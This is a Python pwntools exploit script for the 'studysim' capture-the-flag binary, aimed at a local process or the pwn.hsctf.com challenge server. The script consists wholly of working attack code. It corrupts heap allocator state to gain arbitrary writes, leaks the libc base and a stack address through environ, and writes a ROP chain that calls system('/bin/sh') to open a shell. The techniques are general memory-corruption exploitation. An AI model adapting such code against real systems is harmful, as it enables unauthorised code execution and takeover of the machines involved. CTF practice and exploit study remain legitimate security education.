from pwn import *

e = ELF("./studysim")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.hsctf.com", 5007)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def add(size, data="AAAA"):
  p.sendlineafter(">", "add")
  p.sendlineafter("?", str(size))
  p.sendlineafter("?", data)

def do(amt):
  p.sendlineafter(">", "do")
  p.sendlineafter("?", str(amt))

  p.recvuntil("Only ")
  leak = p.recvuntil(" ")

  return int(leak)
  
def v(i):
  return -((i - 0x404060)/8)

do(4)


add(0x100)

leak = do(1)
print(hex(leak))

do(leak)

do(v(leak - 0x30))
add(0x100, p64(0x404010))

do(do(0))

add(0x3d0)
add(0x3d0, "A" * 16)

p.recvuntil("A" * 16)

libc_base = u64(p.recvuntil("'", drop=True).ljust(8, "\x00")) - 0x7f419f5ab760 + 0x00007f419f3c6000
print(hex(libc_base))


do(v(leak - 0x30))
add(0x100, p64(libc_base + libc.symbols["environ"] - 0x10))

do(do(0))

add(0x3f0)
debug()
add(0x3f0, "A" * 16)

p.recvuntil("A" * 16)

env = u64(p.recvuntil("'", drop=True).ljust(8, "\x00")) - 0x7ffd4bb67568 + 0x7ffd4bb67448
print(hex(env))


do(do(0))
do(v(leak - 0x30))
add(0x100, p64(env))

do(do(0))

add(0x3d0)
add(0x3d0, p64(0x401674) + p64(0x401673) + p64(libc_base + next(libc.search("/bin/sh"))) + p64(libc_base + libc.symbols["system"]))

p.interactive()
